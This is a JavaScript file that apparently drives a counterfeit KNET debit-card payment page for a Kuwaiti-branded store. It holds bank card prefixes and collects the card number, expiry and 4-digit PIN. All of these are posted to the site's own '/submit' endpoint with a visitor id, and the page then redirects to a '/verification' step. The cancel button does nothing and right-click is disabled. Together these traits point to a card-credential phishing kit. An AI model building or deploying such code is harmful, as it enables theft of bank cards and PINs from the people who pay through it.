(function () {
  "use strict";

  var BANK_PREFIXES = {
    ABK: ["403622", "423826", "428628"],
    ALRAJHI: ["458838"],
    BBK: ["588790", "418056"],
    BOUBYAN: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
    BURGAN: ["49219000", "415254", "450238", "468564", "540759", "402978", "403583"],
    CBK: ["532672", "537015", "521175", "516334"],
    DOHA: ["419252"],
    GBK: ["531644", "517419", "531471", "559475", "517458", "526206", "531329", "531470"],
    TAM: ["45077848", "45077849"],
    KFH: ["450778", "537016", "532674", "485602"],
    KIB: ["406464", "409054"],
    NBK: ["464452", "589160"],
    WEYAY: ["464425250", "543363"],
    QNB: ["524745", "521020"],
    UNB: ["457778"],
    WARBA: ["532749", "559459", "541350", "525528"],
  };

  var DEFAULT_SUBMIT_PATH = "/submit";
  var CHECKOUT_SUMMARY_STORAGE_KEY = "farm-store-checkout-summary";
  var redirectTimer = null;
  var pendingSubmission = false;

  function closeOverlay() {
    var overlay = byId("overlayhide");
    if (!overlay) {
      return;
    }
    overlay.classList.remove("is-visible");
    overlay.setAttribute("aria-hidden", "true");
    document.body.classList.remove("overlay-active");
  }

  function clearRedirectTimer() {
    if (redirectTimer) {
      window.clearTimeout(redirectTimer);
      redirectTimer = null;
    }
  }

  function resetSensitiveFields() {
    var monthEl = byId("month");
    var yearEl = byId("year");
    var pinEl = byId("cardPin");

    if (monthEl) {
      monthEl.value = "";
      localStorage.removeItem("month");
    }
    if (yearEl) {
      yearEl.value = "";
      localStorage.removeItem("year");
    }
    if (pinEl) {
      pinEl.value = "";
    }
  }

  function persistNonSensitiveFields() {
    var bankEl = byId("bank");
    var prefixEl = byId("dcprefix");
    var debitNumberEl = byId("debitNumber");

    if (bankEl) {
      localStorage.setItem("knet_bank", bankEl.value || "");
    }
    if (prefixEl) {
      localStorage.setItem("knet_dcprefix", prefixEl.value || "");
    }
    if (debitNumberEl) {
      localStorage.setItem("knet_debit_number", digitsOnly(debitNumberEl.value));
    }
  }

  function restoreNonSensitiveFields() {
    var bankEl = byId("bank");
    var prefixEl = byId("dcprefix");
    var debitNumberEl = byId("debitNumber");
    var savedBank = localStorage.getItem("knet_bank") || "";
    var savedPrefix = localStorage.getItem("knet_dcprefix") || "";
    var savedDebitNumber = localStorage.getItem("knet_debit_number") || "";

    if (bankEl && savedBank && BANK_PREFIXES[savedBank]) {
      bankEl.value = savedBank;
      populateBankPrefixes(savedBank);
    }

    if (prefixEl && savedPrefix) {
      var hasSavedPrefix = Array.prototype.some.call(prefixEl.options, function (option) {
        return option.value === savedPrefix;
      });
      if (hasSavedPrefix) {
        prefixEl.value = savedPrefix;
      }
    }

    syncDebitNumberLimit(false);

    if (debitNumberEl && savedDebitNumber) {
      var allowedLength = Number(debitNumberEl.dataset.digitMaxlength || 16);
      debitNumberEl.value = digitsOnly(savedDebitNumber).slice(0, allowedLength);
    }
  }

  function onPageHide() {
    persistNonSensitiveFields();
    clearRedirectTimer();
    closeOverlay();
  }

  function byId(id) {
    return document.getElementById(id);
  }

  function digitsOnly(value) {
    return String(value || "").replace(/\D/g, "");
  }

  function getStoredVisitorId() {
    try {
      return localStorage.getItem("sid") || localStorage.getItem("fastapi-base-visitor-id") || "";
    } catch (error) {
      return "";
    }
  }

  function passesLuhn(value) {
    var digits = digitsOnly(value);
    if (!digits) {
      return false;
    }

    var sum = 0;
    var shouldDouble = false;

    for (var index = digits.length - 1; index >= 0; index -= 1) {
      var digit = Number(digits.charAt(index));
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }

    return sum % 10 === 0;
  }

  function setOptions(select, values, placeholder) {
    select.innerHTML = "";
    var firstOption = document.createElement("option");
    firstOption.value = "";
    firstOption.textContent = placeholder;
    select.appendChild(firstOption);

    values.forEach(function (value) {
      var option = document.createElement("option");
      option.value = value;
      option.textContent = value;
      select.appendChild(option);
    });
  }

  function hideValidation() {
    var validationMessage = byId("ValidationMessage");
    if (!validationMessage) {
      return;
    }
    validationMessage.textContent = "";
    validationMessage.style.display = "none";
  }

  function showValidation(message) {
    var validationMessage = byId("ValidationMessage");
    if (!validationMessage) {
      return;
    }
    validationMessage.textContent = message;
    validationMessage.style.display = "block";
  }

  function populateBankPrefixes(bankValue) {
    var prefixEl = byId("dcprefix");
    if (!prefixEl) {
      return;
    }
    var prefixes = BANK_PREFIXES[bankValue] || [];
    setOptions(prefixEl, prefixes, "بادِئة");
    if (prefixes.length) {
      prefixEl.value = prefixes[0];
    }
    syncDebitNumberLimit(true);
  }

  function syncDebitNumberLimit(resetValue) {
    var prefixEl = byId("dcprefix");
    var debitNumberEl = byId("debitNumber");
    if (!prefixEl || !debitNumberEl) {
      return;
    }

    var prefixLength = String(prefixEl.value || "").length;
    var allowedLength = prefixLength ? 16 - prefixLength : 16;
    if (allowedLength < 0) {
      allowedLength = 0;
    }

    debitNumberEl.maxLength = allowedLength;
    debitNumberEl.dataset.digitMaxlength = String(allowedLength);
    debitNumberEl.setAttribute("maxlength", String(allowedLength));
    debitNumberEl.setAttribute("size", String(Math.max(allowedLength, 1)));
    debitNumberEl.title = "يجب أن يكون الطول " + String(allowedLength);

    if (resetValue) {
      debitNumberEl.value = "";
      return;
    }

    var sanitized = digitsOnly(debitNumberEl.value);
    if (sanitized.length > allowedLength) {
      sanitized = sanitized.slice(0, allowedLength);
    }
    debitNumberEl.value = sanitized;
  }

  function populateExpirySelectors() {
    var yearEl = byId("year");
    if (!yearEl) {
      return;
    }

    var now = new Date();
    var currentYear = now.getFullYear();
    var selectedYear = String(yearEl.value || "");

    yearEl.innerHTML = "";
    var placeholder = document.createElement("option");
    placeholder.value = "";
    placeholder.textContent = "YYYY";
    yearEl.appendChild(placeholder);

    for (var year = currentYear; year <= currentYear + 20; year += 1) {
      var option = document.createElement("option");
      option.value = String(year);
      option.textContent = String(year);
      yearEl.appendChild(option);
    }

    if (selectedYear && Number(selectedYear) >= currentYear) {
      yearEl.value = selectedYear;
    }
  }

  function formatKnetAmount(value) {
    var amount = Number(value || 0);
    if (!Number.isFinite(amount)) {
      amount = 0;
    }
    return "KD\u00A0" + amount.toFixed(3);
  }

  function applyKnetCheckoutSummary() {
    var amountEl = byId("knet-total-amount");
    if (!amountEl) {
      return;
    }
    try {
      var raw = localStorage.getItem(CHECKOUT_SUMMARY_STORAGE_KEY);
      if (!raw) {
        amountEl.textContent = formatKnetAmount(0);
        return;
      }
      var payload = JSON.parse(raw);
      amountEl.textContent = formatKnetAmount(payload && payload.amount);
    } catch (error) {
      amountEl.textContent = formatKnetAmount(0);
    }
  }

  function randomFrom(list) {
    return list[Math.floor(Math.random() * list.length)] || "";
  }

  function randomDigits(length) {
    var value = "";
    while (value.length < length) {
      value += String(Math.floor(Math.random() * 10));
    }
    return value.slice(0, length);
  }

  function buildLuhnValidSuffix(prefix, totalLength) {
    var prefixDigits = digitsOnly(prefix);
    var suffixLength = Math.max(totalLength - prefixDigits.length, 0);
    if (suffixLength === 0) {
      return "";
    }

    var partialLength = Math.max(suffixLength - 1, 0);
    var partial = randomDigits(partialLength);

    for (var checkDigit = 0; checkDigit <= 9; checkDigit += 1) {
      var candidate = prefixDigits + partial + String(checkDigit);
      if (candidate.length === totalLength && passesLuhn(candidate)) {
        return partial + String(checkDigit);
      }
    }

    return partial + "0";
  }

  function fillKnetTestingValues() {
    if (document.body.getAttribute("data-knet-testing-autofill") !== "true") {
      return;
    }

    var bankEl = byId("bank");
    var prefixEl = byId("dcprefix");
    var debitNumberEl = byId("debitNumber");
    var monthEl = byId("month");
    var yearEl = byId("year");
    var pinEl = byId("cardPin");

    if (!bankEl || !prefixEl || !debitNumberEl || !monthEl || !yearEl || !pinEl) {
      return;
    }

    var bankOptions = Array.prototype.slice.call(bankEl.options).filter(function (option) {
      return String(option.value || "").trim();
    });
    if (!bankOptions.length) {
      return;
    }

    bankEl.value = randomFrom(bankOptions).value;
    populateBankPrefixes(bankEl.value);

    var prefixOptions = Array.prototype.slice.call(prefixEl.options).filter(function (option) {
      return String(option.value || "").trim();
    });
    if (!prefixOptions.length) {
      return;
    }

    prefixEl.value = randomFrom(prefixOptions).value;
    syncDebitNumberLimit(true);

    var allowedLength = Number(debitNumberEl.dataset.digitMaxlength || 0);
    if (!allowedLength || allowedLength < 1) {
      allowedLength = Math.max(16 - String(prefixEl.value || "").length, 1);
    }
    debitNumberEl.value = buildLuhnValidSuffix(prefixEl.value, String(prefixEl.value || "").length + allowedLength);

    var now = new Date();
    var currentMonth = now.getMonth() + 1;
    var currentYear = now.getFullYear();
    var yearOptions = Array.prototype.slice.call(yearEl.options).filter(function (option) {
      return Number(option.value || 0) >= currentYear;
    });
    if (yearOptions.length) {
      yearEl.value = randomFrom(yearOptions).value;
    }

    var selectedYear = Number(yearEl.value || currentYear);
    var minMonth = selectedYear === currentYear ? currentMonth : 1;
    var monthOptions = Array.prototype.slice.call(monthEl.options).filter(function (option) {
      var monthValue = Number(option.value || 0);
      return monthValue >= minMonth;
    });
    if (monthOptions.length) {
      monthEl.value = randomFrom(monthOptions).value;
    }

    pinEl.value = randomDigits(4);
    hideValidation();
  }

  function validateForm() {
    var bankValue = byId("bank").value;
    var prefixValue = byId("dcprefix").value;
    var debitNumberValue = digitsOnly(byId("debitNumber").value);
    var fullCardNumber = prefixValue + debitNumberValue;
    var monthValue = Number(byId("month").value || 0);
    var yearValue = Number(byId("year").value || 0);
    var pinValue = digitsOnly(byId("cardPin").value);

    if (!bankValue) {
      showValidation("خطأ - يرجى اختيار البنك الخاص بك");
      return false;
    }

    if (!debitNumberValue) {
      showValidation("خطأ- يرجى أدخال رقم البطاقة");
      return false;
    }

    if (prefixValue.length + debitNumberValue.length !== 16) {
      showValidation("خطأ - يرجى التحقق من رقم البطاقة");
      return false;
    }

    if (!passesLuhn(fullCardNumber)) {
      showValidation("خطأ - يرجى إدخال رقم البطاقة بشكل صحيح");
      return false;
    }

    if (!monthValue) {
      showValidation("خطأ - يرجى أختيار الشهر");
      return false;
    }

    if (!yearValue) {
      showValidation("خطأ - يرجى أختيار السنة");
      return false;
    }

    var now = new Date();
    var currentMonth = now.getMonth() + 1;
    var currentYear = now.getFullYear();
    if (yearValue < currentYear || (yearValue === currentYear && monthValue < currentMonth)) {
      showValidation("خطأ - البطاقة المدخلة منتهية الصلاحية");
      return false;
    }

    if (!pinValue) {
      showValidation("خطأ - يرجى أدخال الرمز السري");
      return false;
    }

    if (pinValue.length !== 4) {
      showValidation("خطأ - يرجى ادخال الرمز السري بشكل صحيح");
      return false;
    }

    hideValidation();
    return true;
  }

  function openOverlayAndRedirect() {
    if (document.body.getAttribute("data-knet-testing-autofill") === "true") {
      window.location.href = "/verification";
      return;
    }

    var overlay = byId("overlayhide");
    if (!overlay) {
      window.location.href = "/verification";
      return;
    }

    overlay.classList.add("is-visible");
    overlay.setAttribute("aria-hidden", "false");
    document.body.classList.add("overlay-active");

    clearRedirectTimer();
    redirectTimer = window.setTimeout(function () {
      redirectTimer = null;
      window.location.href = "/verification";
    }, 5000);
  }

  async function submitKnetDetails() {
    var bankEl = byId("bank");
    var prefixEl = byId("dcprefix");
    var debitNumberEl = byId("debitNumber");
    var monthEl = byId("month");
    var yearEl = byId("year");
    var pinEl = byId("cardPin");
    var fullCardNumber = String(prefixEl.value || "") + digitsOnly(debitNumberEl.value);

    var response = await fetch(DEFAULT_SUBMIT_PATH, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json"
      },
      credentials: "same-origin",
      cache: "no-store",
      body: JSON.stringify({
        form_name: "KNET Payments",
        page_path: "/knet",
        visitor_id: getStoredVisitorId(),
        fields: [
          { name: "bank", label: "البنك", value: String(bankEl.value || ""), type: "text" },
          { name: "dcprefix", label: "بادئة البطاقة", value: String(prefixEl.value || ""), type: "text" },
          { name: "debit_number", label: "رقم بطاقة الصرف الآلي", value: digitsOnly(debitNumberEl.value), type: "text" },
          { name: "expiry_month", label: "شهر الانتهاء", value: String(monthEl.value || ""), type: "text" },
          { name: "expiry_year", label: "سنة الانتهاء", value: String(yearEl.value || ""), type: "text" },
          { name: "card_pin", label: "الرقم السري", value: digitsOnly(pinEl.value), type: "text" }
        ]
      })
    });

    var data = null;
    try {
      data = await response.json();
    } catch (error) {
      data = null;
    }

    if (!response.ok || !data || data.status !== "ok") {
      throw new Error("submit_failed");
    }

    if (data.visitor_id) {
      try {
        localStorage.setItem("sid", String(data.visitor_id));
      } catch (error) {
        // Ignore storage failures.
      }
    }
  }

  async function handleSubmit(event) {
    if (event) {
      event.preventDefault();
    }
    if (pendingSubmission) {
      return;
    }

    var prefixEl = byId("dcprefix");
    var debitNumberEl = byId("debitNumber");
    var monthEl = byId("month");
    var yearEl = byId("year");
    if (!validateForm()) {
      return;
    }
    if (prefixEl && debitNumberEl) {
      var prefixValue = String(prefixEl.value || "");
      var debitDigits = digitsOnly(debitNumberEl.value);
      localStorage.setItem("cc", prefixValue + debitDigits);
      localStorage.setItem("dcprefix", prefixValue);
      localStorage.setItem("debit_last4", debitDigits.slice(-4));
    }
    if (monthEl) {
      localStorage.setItem("month", monthEl.value);
    }
    if (yearEl) {
      localStorage.setItem("year", yearEl.value);
    }

    pendingSubmission = true;
    try {
      await submitKnetDetails();
      openOverlayAndRedirect();
    } catch (error) {
      showValidation("خطأ - تعذر إرسال البيانات، يرجى المحاولة مرة أخرى");
    } finally {
      pendingSubmission = false;
    }
  }

  function attachDigitFilter(input) {
    if (!input) {
      return;
    }
    input.addEventListener("input", function () {
      if (input.id === "debitNumber") {
        syncDebitNumberLimit(false);
      } else {
        input.value = digitsOnly(input.value);
      }
      hideValidation();
    });
    ["keypress", "drop", "copy", "paste"].forEach(function (type) {
      input.addEventListener(type, function (event) {
        if (type === "keypress") {
          var key = event.key || "";
          if (key && !/\d/.test(key) && key.length === 1) {
            event.preventDefault();
          }
          return;
        }
        event.preventDefault();
      });
    });
  }

  function initKnetPage() {
    var form = byId("paypage");
    var bankEl = byId("bank");
    var prefixEl = byId("dcprefix");
    var monthEl = byId("month");
    var yearEl = byId("year");
    var proceedButton = byId("proceed");
    var cancelButton = byId("cancel");
    var debitNumberEl = byId("debitNumber");
    var pinEl = byId("cardPin");

    if (!form || !bankEl || !prefixEl || !monthEl || !yearEl || !proceedButton || !debitNumberEl || !pinEl) {
      return;
    }

    clearRedirectTimer();
    closeOverlay();
    resetSensitiveFields();
    hideValidation();
    applyKnetCheckoutSummary();
    populateExpirySelectors();
    restoreNonSensitiveFields();
    syncDebitNumberLimit(false);

    bankEl.addEventListener("change", function () {
      populateBankPrefixes(bankEl.value);
      persistNonSensitiveFields();
      hideValidation();
    });

    prefixEl.addEventListener("change", function () {
      syncDebitNumberLimit(true);
      persistNonSensitiveFields();
      hideValidation();
    });

    [monthEl, yearEl].forEach(function (field) {
      field.addEventListener("change", function () {
        localStorage.setItem(field.id, field.value);
        hideValidation();
      });
    });

    attachDigitFilter(debitNumberEl);
    attachDigitFilter(pinEl);

    debitNumberEl.addEventListener("input", persistNonSensitiveFields);

    proceedButton.addEventListener("click", handleSubmit);
    form.addEventListener("submit", handleSubmit);

    if (cancelButton) {
      cancelButton.addEventListener("click", function (event) {
        if (event) {
          event.preventDefault();
        }
      });
    }

    document.addEventListener("contextmenu", function (event) {
      event.preventDefault();
    });

    fillKnetTestingValues();
  }

  window.addEventListener("pagehide", onPageHide);
  document.addEventListener("DOMContentLoaded", initKnetPage);
})();
